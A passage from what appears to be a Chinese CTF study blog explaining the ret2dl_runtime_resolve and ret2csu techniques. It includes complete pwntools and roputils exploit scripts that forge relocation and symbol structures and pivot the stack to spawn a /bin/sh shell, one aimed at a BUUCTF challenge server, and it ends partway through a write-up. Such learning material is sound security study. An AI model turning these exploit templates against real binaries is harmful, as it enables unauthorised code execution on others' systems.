class="comment">#设置成0x0804a800才可以，而我们迁移之后还想让0x0804a800这里的数据是正常的，那就只能迁移到的地址调高0x4个字节，这样</span></span><br><span class="line"><span class="comment">#迁移过来的时候，栈顶（也就是0x0804a800）依然是正常的link_map</span></span><br><span class="line"><span class="comment">#（如果不太理解我说的是什么意思的话，自己可以把base_addr-4改成base_addr用gdb调试一下就知道了）</span></span><br><span class="line">payload1+=p32(leave_ret_addr)<span class="comment">#如果不知道这里为什么要用leave_ret_addr的话</span></span><br><span class="line"><span class="comment">#建议再学习一下栈迁移，我的博客上有一篇详细介绍了栈迁移的文章</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#payload2=&#x27;aaaa&#x27;#上面采用了抬高0x4字节，因此这里不用再填充垃圾数据了，以便让dl_fixup正常执行</span></span><br><span class="line">payload2=p32(plt0)<span class="comment">#这个plt0和下面的reloc_index，他们共同组成了read_plt（具体参考下面的补充③）</span></span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#这四个b就是返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#这个放置的是system的参数的位置，也就是/bin/sh的位置</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#由于read的参数是三个，而system的参数只用了第一个，因此另外两个参数需要填充一下垃圾数据</span></span><br><span class="line">payload2+=fake_rel_plt<span class="comment">#开始放置伪造的rel.plt表</span></span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span><span class="comment">#保证fake_sym是对齐了16字节</span></span><br><span class="line">payload2+=fake_sym<span class="comment">#伪造的Elf32_Sym结构</span></span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span><span class="comment">#最终伪造的字符串，让dl_lookup_symbol_x去搜索这个字符串</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#因为上面提到了会把参数放在偏移80的位置，因此这里填充\x00到偏移80这里</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>补充①</p><p><img src="../img/2706180-20220228094915257-286002672.png" alt=""></p><p>补充②</p><p><img src="../img/2706180-20220228094921502-932826454.png" alt=""></p><p>补充③</p><p><img src="../img/2706180-20220228094929697-1836063513.png" alt=""></p><p>payload2=p32(plt0)<br>payload2+=p32(reloc_index)</p><p>这两步对应的就是图中标注的两步，这也就是plt在干的事情（因此你可以把这两步等同于p32(read_plt_addr)）</p><h2 id="工具攻击">工具攻击</h2><p>另外也可以采用Roputil工具，进行攻击，这个工具的威力是很大的，我们根本不需要改什么东西，只要换个偏移和程序名，然后就一把梭了。工具在此下载https://github.com/inaz2/roputils</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)<span class="comment">#这个rop，就可以理解成elf，这里就是获取了bss段首地址</span></span><br><span class="line">buf = rop.fill(offset)<span class="comment">#填充垃圾数据</span></span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)<span class="comment">#添加一个调用，调用了read函数，后面是它的参数</span></span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)<span class="comment">#第一个参数为伪造的link_map，第二个则是被劫持调用</span></span><br><span class="line"><span class="comment">#函数的参数（system），也就是/bin/sh的位置</span></span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)<span class="comment">#先存入/bin/sh字符串，使其位于bss_base的位置</span></span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)<span class="comment">#填充垃圾数据</span></span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个参数是伪造的link_map首地址（就是system函数名放的位置），第二个参数是要伪造的函数名</span></span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)<span class="comment">#填充垃圾数据</span></span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="BUUCTF上的xdctf2015-pwn200">BUUCTF上的xdctf2015_pwn200</h2><p><img src="../img/2706180-20220228175843037-1667392941.png" alt=""></p><p><img src="../img/2706180-20220228175854393-1488686373.png" alt=""></p><p>在以这道题为例看一下Roputil的威力（不过这道题实在有点杀鸡用牛刀了，因为存在泄露函数，直接用ret2libc也可以）</p><p>我只是拿上面的exp改了一下偏移和远程题目的地址（需要注意的是由于刚开始直接从Roputils里面引入了所有的函数，因此我们要用原本pwntools中的函数时，需要再引用一下）<strong>这里还把上面那个exp中的from pwn import process换成了from pwn import remote</strong>，最后直接一把梭。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25383</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./&#x27; + processName)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret_addr=<span class="number">0x0804851B</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">buf1 = rop.fill(offset)</span><br><span class="line">buf1 += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf1 += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf1)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_base))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220228180305633-1728995910.png" alt=""><br>然后下面我再给出手动构造的exp，其实我还是直接复制了上面的exp，只不过改了几个参数而已，这其实就是个模板而已，我把需要改的参数用三个*标注一下,剩下的直接照搬，一把梭。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28789</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./bof&#x27;)#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#先初始化一下一会要用到的段首地址</span></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span><span class="comment">#***</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span><span class="comment">#***</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span><span class="comment">#***</span></span><br><span class="line"><span class="comment">#这个base_addr是我们要把栈迁移的地方，用gdb发现这一部分是可写的，因此我们选择迁移到这里</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#这个fake_sym_addr是Elf32_Sym结构的首地址</span></span><br><span class="line"><span class="comment">#原本是要把伪造的ELf32_Sym结构写在偏移32的位置的，但是还要对齐，因此下面还要再加align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Sym结构是16字节，因此地址也需要和16字节对齐，二者地址相减</span></span><br><span class="line"><span class="comment">#然后只取最后一位，就可以理解成二者的地址是放在了一个结构里面（但其实不是这样的，不过可以理解成这样，画个图就懂了）</span></span><br><span class="line"><span class="comment">#然后最后的值被0x10所减，求的就是fake_sym_addr距离16个字节所补齐差的字节数</span></span><br><span class="line"><span class="comment">#至于为什么减的是dynsym，淦，因为dynsym一定是被对齐了的，因此它需要找一个对齐的表来做参考啊</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#最后再加上这个为了补齐的字节才是最后我们要构造的fake_sym的地址</span></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#这个st_name就是dynstr段首地址距离目标函数名称的偏移</span></span><br><span class="line"><span class="comment">#我们把最终的system函数名称布置到了fake_sym_addr+0x10的位置，为啥加0x10?因为Elf32_Sym的结构大小为16字节</span></span><br><span class="line">st_info=<span class="number">0x12</span><span class="comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type（不过我感觉没必要区分，直接加起来就行）</span></span><br><span class="line"><span class="comment">#另外就是这个0x12是可以在IDA里面通过dynsym来查到</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)</span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#这个是ret.plt结构中的第一个成员，也就是解析之后的真实地址写入的地方</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#这个我不是太确定，我感觉除0x10是因为Elf32_Sym的大小是16字节</span></span><br><span class="line"><span class="comment"># 这个偏移应该是以一个结构（16字节）为单位的</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#这个0x7是重定位的一种类型，指的是导入函数，进入_dl_fixup函数里面，还会检查这是不是0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#这里&lt;&lt;8是因为，最后还要再&gt;&gt;8，从而保持正常，而&amp;0xf，其实没用，不写也行</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#从rel.plt到base_addr+28的偏移也就</span></span><br><span class="line"><span class="comment"># 是执行_dl_runtime_resolve的第二个参数，而加28的原因是，我们将rel.plt结构布置在了距离base_addr偏移24的位置</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#这里就是伪造的rel.plt结构</span></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#劫持执行流，让程序再执行一次read，将我们想要伪造的内容存入我们指定的地方</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#这里需要用连续三个pop把read的参数给从栈顶清空，不然ret的时候就会出现问题</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#这个放置的是system的参数的位置</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#由于read的参数是三个，而system的参数只用了第一个，因此另外两个参数需要填充一下垃圾数据</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#因为上面提到了会把参数放在偏移80的位置，因此这里填充\x00到偏移80这里</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>ret2dl回顾极速版</h1><p>md，之前写过的文章重新回来再看，感觉太啰嗦了，重新温习了一下，这里写一个关于延迟绑定的过程极速版。</p><blockquote><p>dynamic段 保存了动态链接器所需要基本信息，下面三个都位于dynamic段</p><p>dynstr(dynamic string table)      动态符号字符串表</p><p>dynsym(dynamic symbol)    动态符号表</p><p>rel.plt</p></blockquote><p>延迟绑定的过程核心是_dl_lookup_symbol_x函数拿着搜索的函数名去libc中匹配对应函数，大致过程是用dynstr地址+函数名在dynstr里的偏移来查找到的函数名字符串。</p><p>dynstr里的偏移需要通过rel.plt加上dl_runtime_resolve函数的第二个参数先得到dynsym里的偏移，再通过dynsym里的偏移加上dynsym的地址得到。拿着这个偏移加上dynstr的地址即可。</p><p>用ida简单演示一下过程</p><p>先去rel.plt里找到对应的结构，这个偏移是dl_runtime_resolve函数的第二个参数</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281937155.png" alt="image-20221128193705005"></p><p>然后用上面的那个0x207右移8得到2，这个就是该函数在dynsym里的偏移如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281945695.png" alt="image-20221128194516577"></p><p>然后看一下这个地址0x080472a0的值，如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281946850.png" alt="image-20221128194631780"></p><p>最后拿着这个0x3d加上dynstr的首地址即可找到函数名字，如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947796.png" alt="image-20221128194726664"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947187.png" alt="image-20221128194759131"></p><h1>其他博客链接</h1><p>最后由于参考了很多师傅的博客，这里面我把一些我感觉写的不错的博客放一下，如果对于我上面写的有不懂的也可以看看下面这些博客</p><p>下面这两个博客都把exp分开构造的过程详细写了。</p><p><a href="http://www.soolco.com/post/114840_1_1.html">深入理解-dl_runtime_resolve-博客 (soolco.com)</a></p><p><a href="https://xz.aliyun.com/t/5122#toc-4">高级ROP ret2dl_runtime 之通杀详解 - 先知社区 (aliyun.com)</a></p><p>然后我探究上述_dl_runtime_solve执行流程主要是跟着下面这个师傅的博客做的</p><p><a href="https://www.jianshu.com/p/57f6474fe4c6">_dl_runtime_resolve - 简书 (jianshu.com)</a></p><p>下面这个是介绍_dl_runtime_solve的前置知识很详细</p><p><a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接 - 知乎 (zhihu.com)</a></p><p>下面这个博客是对一些源码做了注释</p><p><a href="https://blog.csdn.net/jazrynwong/article/details/89851640">(25条消息) glibc动态链接器dl_runtime_resolve简要分析_Hello World.c-CSDN博客</a></p><p>下面两个主要是解释了下用到的一些段的解释</p><p><a href="https://www.jianshu.com/p/8dd91ec35dda">https://www.jianshu.com/p/8dd91ec35dda</a></p><p><a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a></p><p>然后这个师傅的exp写的比较清晰，解决了我的一些问题</p><p><a href="https://eqqie.cn/index.php/archives/1023">https://eqqie.cn/index.php/archives/1023</a></p><p>然后下面这个师傅写的应该是最详细的了，对一些小细节有疑问的可以在这上面找找</p><p><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ret2csu的学习总结</title>
      <link href="/posts/4202235.html"/>
      <url>/posts/4202235.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于这个ret2csu，与其说它是一种题型，倒不如说这是一种方法（用于控制寄存器）</p></blockquote><h2 id="什么是ret2csu？">什么是ret2csu？</h2><p>这个其实就是在程序中一般都会有一段万能的控制参数的gadgets，里面可以控制rbx,rbp,r12,r13,r14,r15以及rdx,rsi,edi的值，并且还可以call我们指定的地址。然后劫持程序执行流的时候，劫持到这个__libc_csu_init函数去执行（这个函数是用来初始化libc的，因此只要是动态链接的程序就都会有这个函数（至少我还没有遇见过特殊情况）），<strong>从而达到控制参数的目的</strong>。</p><h2 id="下面是-libc-csu-init的汇编代码。">下面是__libc_csu_init的汇编代码。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0000000000400540                 public __libc_csu_init</span><br><span class="line">.text:0000000000400540 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:0000000000400540 ; __unwind &#123;</span><br><span class="line">.text:0000000000400540                 push    r15</span><br><span class="line">.text:0000000000400542                 push    r14</span><br><span class="line">.text:0000000000400544                 mov     r15d, edi</span><br><span class="line">.text:0000000000400547                 push    r13</span><br><span class="line">.text:0000000000400549                 push    r12</span><br><span class="line">.text:000000000040054B                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400552                 push    rbp</span><br><span class="line">.text:0000000000400553                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:000000000040055A                 push    rbx</span><br><span class="line">.text:000000000040055B                 mov     r14, rsi</span><br><span class="line">.text:000000000040055E                 mov     r13, rdx</span><br><span class="line">.text:0000000000400561                 sub     rbp, r12</span><br><span class="line">.text:0000000000400564                 sub     rsp, 8</span><br><span class="line">.text:0000000000400568                 sar     rbp, 3</span><br><span class="line">.text:000000000040056C                 call    _init_proc</span><br><span class="line">.text:0000000000400571                 test    rbp, rbp</span><br><span class="line">.text:0000000000400574                 jz      short loc_400596</span><br><span class="line">.text:0000000000400576                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400578                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400580</span><br><span class="line">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400580                 mov     rdx, r13</span><br><span class="line">.text:0000000000400583                 mov     rsi, r14</span><br><span class="line">.text:0000000000400586                 mov     edi, r15d</span><br><span class="line">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040058D                 add     rbx, 1</span><br><span class="line">.text:0000000000400591                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594                 jnz     short loc_400580</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400596                 add     rsp, 8</span><br><span class="line">.text:000000000040059A                 pop     rbx</span><br><span class="line">.text:000000000040059B                 pop     rbp</span><br><span class="line">.text:000000000040059C                 pop     r12</span><br><span class="line">.text:000000000040059E                 pop     r13</span><br><span class="line">.text:00000000004005A0                 pop     r14</span><br><span class="line">.text:00000000004005A2                 pop     r15</span><br><span class="line">.text:00000000004005A4                 retn</span><br><span class="line">.text:00000000004005A4 ; &#125; // starts at 400540</span><br><span class="line">.text:00000000004005A4 __libc_csu_init endp</span><br></pre></td></tr></table></figure><h2 id="如何利用csu这部分代码？">如何利用csu这部分代码？</h2><p><img src="../img/2706180-20220218171725002-1163274691.png" alt=""></p><p>我们利用的其实就是这两部分的代码，我们给这两段起个名字，上面的部分叫gadget2，下面的部分叫gadget1（因为我们先执行下面的部分，因此就叫下面的gadget1吧）</p><p>假设我们现在通过溢出，已经可以控制程序的执行流了，我们此时就把返回地址填写成gadget1的地址0x40059A（因为我们并不需要add rsp,8这个指令，因此直接从0x40059A开始即可）</p><p>现在就会把栈中的前6个数据分别弹给rbx,rbp,r12,r13,r14,r15这六个寄存器。</p><p>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call    qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。</p><p>又因为这三个指令add     rbx,；cmp     rbx, rbp；jnz     short loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.</p><p>然后r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。</p><p>然后r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p><p>接着到了gadget1的结尾ret这里，然后我们紧接着写入gadget2的地址0x400580。<br><img src="../img/2706180-20220218171748437-1273885946.png" alt=""></p><p>此时开始执行这部分代码，这没什么好说的了，就是把r13,r14,r15的值放入rdx,rsi,edi三个寄存器里面。</p><p>然后由于我们前面的rbx是0，加一之后等于了rbp，因此jnz不跳转。那就继续向下执行，如果我们上面call了一个空函数的话，那我们就利用下面的ret。由于继续向下执行，因此又来到了gadget1这里。</p><p><img src="../img/2706180-20220218171758126-1557535385.png" alt=""></p><p>如果不需要再一次控制参数的话，那我们此时把栈中的数据填充56（7*8你懂得）个垃圾数据即可。</p><p>如果我们还需要继续控制参数的话，那就此时不填充垃圾数据，继续去控制参数，总之不管干啥呢，这里都要凑齐56字节的数据，以便我们执行最后的ret，最后ret去执行我们想要执行的函数即可。</p><h3 id="错位获取pop-rsi-pop-rdi">错位获取pop rsi;pop rdi</h3><p>如果只是要单纯控制pop rsi和pop rdi寄存器的话，可以不用ret2csu，直接搜的。因为pop r14和pop r15（这两个gadget存在于__libc_csu_init)对应的机器码分别为</p><p><img src="../img/2706180-20220416083231234-1556484483.png" alt=""></p><p>（汇编如何看对应的机器码，我在shellcode那一篇博客中已经讲过了）可以发现pop rsi和pop rdi分别存在于pop r14和pop r15的机器码中，因此我们可以利用错位来得到他们。用Ropgadget直接搜pop rsi或是搜它的机器码5e，就会出来错位得到的地址。(方法如下)不过没有办法通过错位来得到pop rdx。</p><p><img src="../img/2706180-20220416083243224-1368780037.png" alt=""></p><h2 id="ret2csu相关题目">ret2csu相关题目</h2><p>下面是我做过三道关于ret2csu的题目，附上WP</p><h3 id="VNCTF2022公开赛clear-got">VNCTF2022公开赛clear_got</h3><p>做这道题，必须先掌握下面这三个点。</p><p>1、首先是call指令后面的这个地址（如果是函数名就不说了），就比如现在ret2csu中，准备执行这个</p><p><img src="../img/2706180-20220218171949096-1693789079.png" alt=""></p><p>我们让rbx为0，此时call r12，那怎么才能call成功呢，原本看到师傅们说是要装got地址，后来发现装一个地址（这个地址是被另一个地址所指向的），然后把r12填写成另一个地址，也可以call成功，再回想一下为什么要装got地址，而不是plt地址，原因也是出现在了got地址仅仅会跳转一次，也就是说填一个got地址，也是会从这个地址去跳到got地址所指向的地址（也就是真实地址（因为延迟绑定的原因，如果不清楚的话，这里请自行百度一下延迟绑定机制）），因此结论就出来了，要想去call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面。</p><p>2、如果我们仅仅是想利用ret2csu去控制参数，而并不想去用call执行，或者说是你想用call执行跳转，但是你找不到去指向你想跳转的那个地址，因此我们用最后的ret跳转（你想跳转到哪里，就填哪的地址即可）。那怎么把call的那一步忽略呢？我们可以call一个空函数（不需要参数，执行之后也不会对程序本身造成任何影响的函数），这个函数就是_term_proc（注意，这里call的是指向_term_proc的地址，而非term_proc的地址</p><p><img src="../img/2706180-20220218171956921-899601017.png" alt=""></p><p>3、怎么去修改rax的值？</p><p>这里提到了一种很巧妙的方法。我们先来看一下read函数和write函数的返回值。</p><p><img src="../img/2706180-20220218172005653-329466746.png" alt=""></p><p>图片出自(25条消息) read的返回值卖保险的码农的博客-CSDN博客read函数返回值</p><p>read和write函数 - 故事， - 博客园 (<a href="http://cnblogs.com">cnblogs.com</a>)</p><p>我们可以看出来read函数和write函数最后的返回值都是实际读到和写入的字节数（如果执行成功的话），而返回值最后就会放到rax里面。也就是说可以利用read和write去控制我们想要的rax。（为啥要控制rax？淦，你只要知道这个控制rax的方法就行了，需要的时候就能用到，就比如这道题）</p><p>掌握上述三点之后，就可以来做题了。</p><p><img src="../img/2706180-20220218172017865-1429417700.png" alt=""></p><p><img src="../img/2706180-20220218172033310-262577355.png" alt=""></p><p>发现主函数很简单，buf也是存在溢出，意味着我们可以控制返回地址。</p><p><img src="../img/2706180-20220218172041135-1398354103.png" alt=""></p><p>没有发现后门函数和参数，但是发现有两个系统调用，这里很可疑，留意一下。</p><p>这道题的困难点其实在这里<br><img src="../img/2706180-20220218172048110-1930281658.png" alt=""></p><p>Memset清空了0x601008往下面的0x38个字节的内容，我们看一下0x601008是什么<br><img src="../img/2706180-20220218172054303-1345094970.png" alt=""></p><p>发现居然是got表，got表被清空了意味着什么，1、我们之前已经完成延迟绑定的函数的真实地址已经不在got表了。2、最开始（执行延迟绑定之前）got表原本跳往extern的地址，变成了0。</p><p>也就是说执行了这个memset之后，我们在got表中的所有函数都没法再被使用了。</p><p>但是我们能用的有什么？只剩下了系统调用，可是想用系统调用执行execve(‘/bin/sh’,0,0)，我们需要做到三件事，第一是控制rax，第二是控制rdi,rsi,rdx这三个寄存器，第三是将/bin/sh写入到bss段。</p><p>控制rax？，有没有想到最开始提到的那个方法，利用read或者write去修改rax。由于我们还要写入/bin/sh，因此我们这里采用系统调用read，可是read的系统调用号是0，而程序中出现的两个系统调用没有read，怎么办？其实不用管的，因为main函数的返回值是0，在main函数的ret之前，就把rax的值给设成0了，因此我们溢出之后，始终rax都是0（在执行系统调用之前）。</p><p>既然现在可以系统调用read，那只需要控制参数，将/bin/sh写入bss段即可，怎么控制参数？用Ropgadget搜索之后发现，没有能控制rsi和rdx的寄存器，因此只能采用ret2csu的方法。</p><p>最后有两点要注意</p><p>第一，  我们系统调用了一次输入，在这次输入里，必须填充到59个字节</p><p>第二，  